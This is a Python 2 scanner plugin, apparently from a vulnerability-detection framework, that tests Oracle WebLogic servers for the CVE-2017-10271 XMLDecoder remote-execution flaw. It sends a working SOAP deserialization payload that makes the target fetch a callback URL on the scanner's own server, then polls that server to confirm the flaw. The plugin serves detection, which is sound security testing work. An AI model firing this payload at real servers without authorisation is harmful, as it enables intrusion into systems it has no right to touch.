#!/usr/bin/python
#coding:utf-8

import random
import urllib2
import socket
from time import sleep

def get_plugin_info():
    plugin_info = {
            "name": "WebLogic WLS RCE CVE-2017-10271",
            "info": "Oracle WebLogic Server WLS安全组件中的缺陷导致远程命令执行",
            "level": "高危",
            "type": "命令执行",
            "author": ".@sinosig",
            "url": "https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html",
            "keyword": "tag:weblogic",
            "source": 1
    }
    return plugin_info

def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)


def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr


def check(ip, port, timeout):
    test_str = random_str(6)
    server_ip = get_ver_ip(ip)
    check_url = ['/wls-wsat/CoordinatorPortType','/wls-wsat/CoordinatorPortType11']

    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        'SOAPAction': "",
        'Content-Type': 'text/xml;charset=UTF-8',
        }

    post_str = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
          <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
              <java version="1.8" class="java.beans.XMLDecoder">
                <void class="java.net.URL">
                  <string>http://%s:8088/add/%s</string>
                  <void method="openStream"/>
                </void>
              </java>
            </work:WorkContext>
          </soapenv:Header>
          <soapenv:Body/>
        </soapenv:Envelope>
                ''' % (server_ip, test_str)
    for url in check_url:
        target_url = 'http://'+ip+':'+str(port)+url.strip()
        req = urllib2.Request(url=target_url, headers=heads)
        if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
                req = urllib2.Request(url=target_url, data=post_str, headers=heads)
                try:
                    urllib2.urlopen(req, timeout=15).read()
                except urllib2.URLError:
                    pass
                sleep(2)
                check_result = urllib2.urlopen("http://%s:8088/check/%s" %(server_ip, test_str), timeout=timeout).read()
                if "YES" in check_result:
                    return "存在WebLogic WLS远程执行漏洞(CVE-2017-10271)"
        else:
            pass
